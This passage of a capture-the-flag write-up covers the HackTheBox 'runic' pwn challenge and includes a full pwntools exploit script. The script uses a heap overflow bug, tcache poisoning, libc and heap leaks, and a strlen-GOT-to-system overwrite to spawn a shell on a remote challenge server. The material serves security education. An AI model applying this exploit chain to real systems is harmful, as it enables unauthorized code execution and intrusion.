# Leak libc address by overflowing our main_chunk via the edit bug again
# (just like before when we try to leak heap baddress)
payload = b'b'*0x28
edit(key(0x30001), key(0x10001), payload)
out = show(key(0x10001))
leaked_libc_addr = u64(out[-6:].ljust(8, b'\x00'))
libc.address = leaked_libc_addr - 0x1f2cc0
log.info(f'libc base: {hex(libc.address)}')

# Fix its metadata (revert it just like before we overflow)
payload = b'b'*0x18 + p64(0) + p64(0xa1)
edit(key(0x10001), key(0x20001), payload)

```


```
1

```


```
[*] libc base: 0x7fac6f800000

```


Now that we’ve got a libc leak, it’s time to move to the last step.


#### Gain Remote Code Execution


The binary is using `libc-2.35`, which means we can’t use `__free_hook` anymore. The easiest trick to get a `system` in this glibc is we can try to overwrite the GOT entry of `strlen` in `libc`, so that when it called `puts("/bin/sh")`, it will trigger `system("/bin/sh")`, because `puts` will call `strlen` to the input string. I found this trick from this blog.


To do that, we will once again do the `tcache` poisoning, to allocate a chunk to the `strlen` GOT in libc. First, let’s take a look on how the GOT looks like.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26

```


```
pwndbg> tele 0x7fac6f9f2000 25
00:0000│  0x7fac6f9f2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f1bc0
01:0008│  0x7fac6f9f2008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fac6fb62000 —▸ 0x7fac6f800000 ◂— 0x3010102464c457f
02:0010│  0x7fac6f9f2010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fac6fb7b2c0 (_dl_runtime_resolve_xsavec) ◂— endbr64
03:0018│  0x7fac6f9f2018 (*ABS*@got.plt) —▸ 0x7fac6f9790a0 (__strnlen_avx2) ◂— endbr64
04:0020│  0x7fac6f9f2020 (*ABS*@got.plt) —▸ 0x7fac6f974f50 (__rawmemchr_avx2) ◂— endbr64
05:0028│  0x7fac6f9f2028 (realloc@got[plt]) —▸ 0x7fac6f82c030 ◂— endbr64
06:0030│  0x7fac6f9f2030 (*ABS*@got.plt) —▸ 0x7fac6f976f00 (__strncasecmp_avx) ◂— endbr64
07:0038│  0x7fac6f9f2038 (_dl_exception_create@got.plt) —▸ 0x7fac6f82c050 ◂— endbr64
08:0040│  0x7fac6f9f2040 (*ABS*@got.plt) —▸ 0x7fac6f97bea0 (__mempcpy_avx_unaligned_erms) ◂— endbr64
09:0048│  0x7fac6f9f2048 (*ABS*@got.plt) —▸ 0x7fac6f97c560 (__wmemset_avx2_unaligned) ◂— endbr64
0a:0050│  0x7fac6f9f2050 (calloc@got[plt]) —▸ 0x7fac6f82c080 ◂— endbr64
0b:0058│  0x7fac6f9f2058 (*ABS*@got.plt) —▸ 0x7fac6f9741c0 (__strspn_sse42) ◂— endbr64
0c:0060│  0x7fac6f9f2060 (*ABS*@got.plt) —▸ 0x7fac6f974c80 (__memchr_avx2) ◂— endbr64
0d:0068│  0x7fac6f9f2068 (*ABS*@got.plt) —▸ 0x7fac6f97bec0 (__memmove_avx_unaligned_erms) ◂— endbr64
0e:0070│  0x7fac6f9f2070 (*ABS*@got.plt) —▸ 0x7fac6f97cb20 (__wmemchr_avx2) ◂— endbr64
0f:0078│  0x7fac6f9f2078 (*ABS*@got.plt) —▸ 0x7fac6f97b0e0 (__stpcpy_avx2) ◂— endbr64
10:0080│  0x7fac6f9f2080 (*ABS*@got.plt) —▸ 0x7fac6f97c720 (__wmemcmp_avx2_movbe) ◂— endbr64
11:0088│  0x7fac6f9f2088 (_dl_find_dso_for_object@got.plt) —▸ 0x7fac6f82c0f0 ◂— endbr64
12:0090│  0x7fac6f9f2090 (*ABS*@got.plt) —▸ 0x7fac6f97a780 (__strncpy_avx2) ◂— endbr64
13:0098│  0x7fac6f9f2098 (*ABS*@got.plt) —▸ 0x7fac6f978f20 (__strlen_avx2) ◂— endbr64
14:00a0│  0x7fac6f9f20a0 (*ABS*@got.plt) —▸ 0x7fac6f975894 (__strcasecmp_l_avx) ◂— endbr64
15:00a8│  0x7fac6f9f20a8 (*ABS*@got.plt) —▸ 0x7fac6f97a3f0 (__strcpy_avx2) ◂— endbr64
16:00b0│  0x7fac6f9f20b0 (*ABS*@got.plt) —▸ 0x7fac6f97d780 (__wcschr_avx2) ◂— endbr64
17:00b8│  0x7fac6f9f20b8 (*ABS*@got.plt) —▸ 0x7fac6f978b40 (__strchrnul_avx2) ◂— endbr64
18:00c0│  0x7fac6f9f20c0 (*ABS*@got.plt) —▸ 0x7fac6f9750c0 (__memrchr_avx2) ◂— endbr64

```


The target is to overwrite `__strlen_avx2` to `system`. Notes that `__strlen_avx2` address is ended with `0x8`, which mean we can’t set it directly to strlen GOT address because it will trigger alignment error. We also couldn’ set it to GOT - 0x8, because during allocation via `tcache`, the `entry+8` will be cleared to 0 (due to the logic inside `tcache` where it will clear the `tcache` key value), which means `strlen` will be set to 0 first during calling `malloc`. Check this LOCs of **create function for the proof:


```
1
2
3
4
5
6
7

```


```
      nbytes_4 = (char *)malloc(nbytes + 8);
      strcpy(*((char **)&MainTable + v1), (const char *)&buf);
      *(_QWORD *)(*((_QWORD *)&MainTable + v1) + 8LL) = nbytes_4;
      *(_DWORD *)(*((_QWORD *)&MainTable + v1) + 16LL) = nbytes;
      strcpy(nbytes_4, (const char *)&buf);
      puts("Rune contents: ");
      read(0, nbytes_4 + 8, nbytes);

```


Notice that before we were able to fill it, the binary call `puts("Rune contents:")`, and because `puts` has dependency to `strlen`, the binary will crash because the `strlen` is still `0` due to the `malloc`.


So, the best place is to set the chunk address to GOT-0x18, so that during calling `malloc`, the `strlen` won’t be cleared.


Let’s continue our previous script.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

```


```
# Remember that this allocation will still be placed in the exact same address as 
# our poisoned_chunk (which is adjacent to the main_chunk). The reason is because 
# there isn't any tcache[0x50] entries yet, so this allocation will take a place in 
# the unsorted bin chunk address, which is still adjacent to our main_chunk.
create(key(0x33), 0x38, b'a'*0x38)
create(key(0x22), 0x38, b'a'*0x38)
delete(key(0x22))
delete(key(0x33)) # Now, as usual, poisoned_chunk contains address to heap chunk

# Overwrite it to strlen GOT - 0x18
# We can't set it directly to strlen GOT because:
# - It will trigger alignment error (because the last 8 bit of strlen GOT is 0x8)
#
# We alo can't set it to GOT - 0x8 because:
# - During allocation via tcache, the entry+8 will be cleared to 0, which mean strlen
#   will be set to 0.
# - Before we were able to fill it, the binary call puts("Rune contents:"), and because puts
#   has dependency to strlen, the binary will crash.
# 
# So, the best place is to set the chunk address to GOT - 0x18 
payload = b'b'*0x18 + p64(0) + p64(0x51)
payload += p64(mangle(heap_base, libc.address+0x1f2098-0x18))
edit(key(0x20001), key(0x30001), payload)

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000001	0x6262626262626262 <- main_chunk
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x0000000000000051
0x561b6d1f3340:	0x00007fa90e29f173	0x370a42ea29d203d9 <- poisoned_chunk
0x561b6d1f3350:	0x6161616161616161	0x6161616161616161
0x561b6d1f3360:	0x6161616161616161	0x6161616161616161
0x561b6d1f3370:	0x6161616161616161	0x6161616161616161
...
pwndbg> bins
tcachebins
0x20 [ 52]: 0x0
0x30 [  0]: 0x561b7d1f3
0x50 [  2]: 0x561b6d1f3340 —▸ 0x7fac6f9f2080 (*ABS*@got.plt) ◂— 0x7fab95513ed2
0xa0 [  7]: 0x0

```


As you can see, the `tcache[0x50]` is now pointing to the `strlen` GOT-0x18. Now, we just need to allocate two more chunks, and the second chunk will be placed in the `strlen` GOT-0x18.


```
1
2
3
4
5
6
7
8

```


```
# Allocate /bin/sh\x00. We will call puts to this chunk later
create(b'a'*8, 0x38, b'/bin/sh\x00')
# Now, next allocation will be placed in strlen GOT-0x18

# Overwrite strlen GOT in libc with system
# __wmemcmp_avx2_movbe + _dl_find_dso_for_object@got.plt + __strncpy_avx2 + system
payload = p64(libc.address+0x2c0f0) + p64(libc.address+0x17a780) + p64(libc.symbols['system'])
create(key(0x21), 0x38, payload)

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21

```


```
pwndbg> tele 0x7fac6f9f2000 25
00:0000│  0x7fac6f9f2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f1bc0
01:0008│  0x7fac6f9f2008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fac6fb62000 —▸ 0x7fac6f800000 ◂— 0x3010102464c457f
02:0010│  0x7fac6f9f2010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fac6fb7b2c0 (_dl_runtime_resolve_xsavec) ◂— endbr64
03:0018│  0x7fac6f9f2018 (*ABS*@got.plt) —▸ 0x7fac6f9790a0 (__strnlen_avx2) ◂— endbr64
04:0020│  0x7fac6f9f2020 (*ABS*@got.plt) —▸ 0x7fac6f974f50 (__rawmemchr_avx2) ◂— endbr64
05:0028│  0x7fac6f9f2028 (realloc@got[plt]) —▸ 0x7fac6f82c030 ◂— endbr64
06:0030│  0x7fac6f9f2030 (*ABS*@got.plt) —▸ 0x7fac6f976f00 (__strncasecmp_avx) ◂— endbr64
07:0038│  0x7fac6f9f2038 (_dl_exception_create@got.plt) —▸ 0x7fac6f82c050 ◂— endbr64
08:0040│  0x7fac6f9f2040 (*ABS*@got.plt) —▸ 0x7fac6f97bea0 (__mempcpy_avx_unaligned_erms) ◂— endbr64
09:0048│  0x7fac6f9f2048 (*ABS*@got.plt) —▸ 0x7fac6f97c560 (__wmemset_avx2_unaligned) ◂— endbr64
0a:0050│  0x7fac6f9f2050 (calloc@got[plt]) —▸ 0x7fac6f82c080 ◂— endbr64
0b:0058│  0x7fac6f9f2058 (*ABS*@got.plt) —▸ 0x7fac6f9741c0 (__strspn_sse42) ◂— endbr64
0c:0060│  0x7fac6f9f2060 (*ABS*@got.plt) —▸ 0x7fac6f974c80 (__memchr_avx2) ◂— endbr64
0d:0068│  0x7fac6f9f2068 (*ABS*@got.plt) —▸ 0x7fac6f97bec0 (__memmove_avx_unaligned_erms) ◂— endbr64
0e:0070│  0x7fac6f9f2070 (*ABS*@got.plt) —▸ 0x7fac6f97cb20 (__wmemchr_avx2) ◂— endbr64
0f:0078│  0x7fac6f9f2078 (*ABS*@got.plt) —▸ 0x7fac6f97b0e0 (__stpcpy_avx2) ◂— endbr64
10:0080│  0x7fac6f9f2080 (*ABS*@got.plt) —▸ 0x7fac6f970021 (__strncmp_sse42+3137) ◂— sub ebx, 0x10
11:0088│  0x7fac6f9f2088 (_dl_find_dso_for_object@got.plt) —▸ 0x7fac6f82c0f0 ◂— endbr64
12:0090│  0x7fac6f9f2090 (*ABS*@got.plt) —▸ 0x7fac6f97a780 (__strncpy_avx2) ◂— endbr64
13:0098│  0x7fac6f9f2098 (*ABS*@got.plt) —▸ 0x7fac6f84e320 (system) ◂— endbr64

```


We have successfully overwritten the `strlen` GOT to system. Now, we just need to call `puts()` to the hashmap entry with key `0x38` to get a shell :).


```
1
2
3
4
5
6
7
8

```


```
# Now, calling puts will call system as well, which means
# puts('/bin/sh') will be hijacked to system('/bin/sh')
r.sendline(b'4')
r.readrepeat(1)
r.sendline(b'a'*0x8) # Call puts

# We got shell
r.interactive()

```


![https://i.imgur.com/QRyFgIj.png](images/img_8.svg)


#### Full Script


Below is my full script:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275

```


```
'''
Cheatsheet:
one_gadget <libc_file>
ROPgadget --binary <binary_file>
readelf -s <libc_file> | grep <something>
readelf --sections <binary_file> | egrep "Name|.rela.plt|.dynsym|.dynstr"
rsactftool -n <modulus> -e <exponent> --private
pwninit <- patch ELF with the correct libc

libc = ELF(libc_path)
read_got = exe.got['read']
read_plt = exe.plt['read']
libc_system = libc.symbols['system']
bin_sh_string_addr = next(libc.search(b'/bin/sh'))
bss = elf.bss()
sc = asm(shellcraft.amd64.linux.sh())
libcdb.unstrip_libc('./libc-2.31.so')

from pwn import *
kernel = ELF('./vmlinux')
hex(next(kernel.search(b'/sbin/modprobe\0')))

unsorted_bin > fastbin

https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call

pub = RSA.importKey(open("pub.pem", "rb").read(), passphrase=None)
e = pub.e
n = pub.n
'''
from Crypto.Cipher import AES, PKCS1_OAEP, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Hash import SHA3_256, HMAC, BLAKE2s
from Crypto.Util.number import *
import glob, gmpy2, pickle, itertools, sys, json, hashlib, os, math, time, base64, binascii, string, re, struct, datetime, subprocess
from base64 import b64encode, b64decode
from pwn import p64, u64, p32, u32
from pwn import *

exe = ELF("runic_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "165.232.98.11"
remote_port = 30688
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()

def create(name, length, contents):
    r.sendlineafter(b': \n', b'1')
    r.sendafter(b': \n', name)
    r.sendlineafter(b': \n', str(length).encode())
    if length > 0:
        r.sendafter(b': \n', contents)

def delete(name):
    r.sendlineafter(b': \n', b'2')
    r.sendafter(b': \n', name)

def edit(name, new_name, contents):
    r.sendlineafter(b': \n', b'3')
    r.sendafter(b': \n', name)
    r.sendafter(b': \n', new_name)
    r.sendafter(b': \n', contents)

def show(name):
    r.sendlineafter(b': \n', b'4')
    r.sendafter(b': \n', name)
    r.recvuntil(b'contents:\n')
    r.recvline()
    out = r.recvuntil(b'\n1')[:-2]
    return out

def key(k):
    return p64(k)

'''
Bug:
Notice that in the edit feature, you can use the size from other item due to bug on
calculating the hash with strcpy. So, during filling the contents of a rune in the
edit feature, there is this LOCs (simplified version):

...
read(0, new_rune_name, 8uLL);
...
new_rune_hash_1 = hash(new_rune_name); // Calculate hash of new rune name
strcpy(MainTable[new_rune_hash_1].item, new_rune_name);
old_rune_chunk_ptr = &MainTable[hash(old_rune_name)].item->rune_chunk;
new_rune_hash_1_1 = hash((__int64)new_rune_name);
memcpy(&MainTable[new_rune_hash_1_1].item->rune_chunk, old_rune_chunk_ptr, 0xCuLL);// Copy heap pointer address from old rune to new rune
...
strcpy(edited_rune_chunk, new_rune_name);
...
new_rune_hash_2 = hash((__int64)edited_rune_chunk);
read(0, edited_rune_chunk + 8, LODWORD(MainTable[new_hash].item->rune_size));
...

If our new_rune_name has null byte, for example b'\x01\x00\x01', strcpy will stop copy
after it find a null-byte. So, the result of new_rune_hash_1_1 and new_rune_hash_2 will be different.
This means that the rune_size used during changing the content will be wrong (instead of taking
the rune size with new_rune_hash_1_1, it will take the rune size of new_rune_hash_2, which can be
larger or smaller).

We can exploit this to overflow our heap, and leverage it to get code execution.
'''

'''
Initial Setup
'''
# The only purpose for this chunk is we need the size to be used
# during the edit bug. Set the key to `\x01`
create(key(0x01), 0x60, b'a'*0x60) # Let's call this `helper_chunk_a`

# We will use this chunk a lot later
create(key(0x32), 0x18, b'b'*0x18) # Let's call this `main_chunk`

# This chunk will be used as our main target to be poisoned
create(key(0x33), 0x18, b'c'*0x18) # Let's call this `poisoned_chunk`

# This chunk will be used as a helper during poisoning our `poisoned_chunk`
create(key(0x34), 0x18, b'd'*0x18) # Let's call this `helper_chunk_b`

# These allocations purposes are for heap chunks alignment later.
create(key(0x35), 0x8, b'e'*0x8)
create(key(0x36), 0x18, b'c'*0x8 + p64(0)+p64(0x41)) # Need this to align the chunks later after forgery
create(key(0x37), 0x18, b'd'*0x18)
create(key(0x38), 0x18, b'e'*0x18) # Just to be safe to prevent consolidation (heap chunk got merged during free)

'''
Leak heap address
'''
# Let's start by freeing our helper_chunk_b continue with poisoned_chunk
delete(key(0x34))
delete(key(0x33))
# Now, poisoned_chunk contain a mangled heap pointer to the helper_chunk_b address

# Leak heap address by overflowing the `main_chunk` via edit feature.
# Overflow it until just before the mangled heap pointer location.
payload = b'b'*0x28

# Set new key to `\x01\x00\x01`
# Due to the edit bug, when fetching the size for the rune contents, it will
# used size of entry with hash `\x01`, which is helper_chunk_a size (0x60)
edit(key(0x32), key(0x10001), payload)

# Show the content, and last 6 bytes will be the mangled heap pointer of helper_chunk_b address
out = show(key(0x10001))
leaked_heap_addr = demangle(u64(out[-6:].ljust(8, b'\x00')))
heap_base = leaked_heap_addr >> 12 << 12
log.info(f'heap_base: {hex(heap_base)}')

'''
Leak libc base.
We will leak libc base by trying to free a chunk to the unsorted bin
'''
# Poison poisoned_chunk tcache pointer to point
# to tcache_perthread_struct (heap_base+0x10)
tcache_struct_addr = heap_base+0x10
fake_metadata = b'b'*0x18 + p64(0) + p64(0x21) + p64(mangle(heap_base, tcache_struct_addr))
edit(key(0x10001), key(0x20001), fake_metadata)
# Now, poisoned_chunk tcache pointer will point to
# tcache_perthread_struct instead of helper_chunk_b.

create(key(0x33), 0x18, b'a'*0x18) # Call malloc, next allocation will be placed in the tcache_perthread_struct

# This malloc will go to tcached_perthread_struct
create(key(0x34), 0x18, p64(0)+p64(0x7))
# Now, we have successfully allocate a chunk to the tcache_perthread_struct
# + we also overwrite the tcache[0xa0] size to 7, so that it is considered as full

# Now, let forge the size of our poisoned_chunk to 0xa1 with the edit bug
fake_metadata = b'b'*0x18 + p64(0) + p64(0xa1)
edit(key(0x20001), key(0x30001), fake_metadata)

# Free it, because the tcache[0xa0] is full, it will go to unsorted bin
delete(key(0x33))
# Now, poisoned_chunk contains libc address

# Leak libc address by overflowing our main_chunk via the edit bug again
# (just like before when we try to leak heap baddress)
payload = b'b'*0x28
edit(key(0x30001), key(0x10001), payload)
out = show(key(0x10001))
leaked_libc_addr = u64(out[-6:].ljust(8, b'\x00'))
libc.address = leaked_libc_addr - 0x1f2cc0
log.info(f'libc base: {hex(libc.address)}')

# Fix its metadata (revert it just like before we overflow)
payload = b'b'*0x18 + p64(0) + p64(0xa1)
edit(key(0x10001), key(0x20001), payload)

'''
Code Execution.
'''
# We will overwrite GOT entry of strlen in libc base with system
# (__strlen_avx2 to system).
# The GOT entry stored in libc.address+0x1f2090

# Poison the tcache again just like before, but instead of
# forging the entry to tcache_perthread_struct, forge it to
# strlen GOT - 0x18 in libc.
# Setup the tcache[0x50]
# Remember that this allocation will still be placed in the exact same address as 
# our poisoned_chunk (which is adjacent to the main_chunk). The reason is because 
# there isn't any tcache[0x50] entries yet, so this allocation will take a place in 
# the unsorted bin chunk address, which is still adjacent to our main_chunk.
create(key(0x33), 0x38, b'a'*0x38)
create(key(0x22), 0x38, b'a'*0x38)
delete(key(0x22))
delete(key(0x33)) # Now, as usual, poisoned_chunk contains address to heap chunk

# Overwrite it to strlen GOT - 0x18
# We can't set it directly to strlen GOT because:
# - It will trigger alignment error (because the last 8 bit of strlen GOT is 0x8)
#
# We alo can't set it to GOT - 0x8 because:
# - During allocation via tcache, the entry+8 will be cleared to 0, which mean strlen
#   will be set to 0.
# - Before we were able to fill it, the binary call puts("Rune contents:"), and because puts
#   has dependency to strlen, the binary will crash.
# 
# So, the best place is to set the chunk address to GOT - 0x18 
payload = b'b'*0x18 + p64(0) + p64(0x51)
payload += p64(mangle(heap_base, libc.address+0x1f2098-0x18))
edit(key(0x20001), key(0x30001), payload)

# Allocate /bin/sh\x00. We will call puts to this chunk later
create(b'a'*8, 0x38, b'/bin/sh\x00')
# Now, next allocation will be placed in strlen GOT-0x18

# Overwrite strlen GOT in libc with system
# __wmemcmp_avx2_movbe + _dl_find_dso_for_object@got.plt + __strncpy_avx2 + system
payload = p64(libc.address+0x2c0f0) + p64(libc.address+0x17a780) + p64(libc.symbols['system'])
create(key(0x21), 0x38, payload)

# Now, calling puts will call system as well, which means
# puts('/bin/sh') will be hijacked to system('/bin/sh')
r.sendline(b'4')
r.readrepeat(1)
r.sendline(b'a'*0x8) # Call puts

# We got shell
r.interactive()

```


>


**Flag: HTB{k1ng_0f_h4sh1n_4nd_m4st3r_0f_th3_run3s}


# Social Media


Follow me on twitter


                Share on**


        * Writeup, Cyber Apocalypse, Htb, Pwn, Heap, Tcache, UDA, Buffer Overflow, ROP


    *ACSC 2023
            *Cyber Apocalypse 2023: Crypto


            *

        **
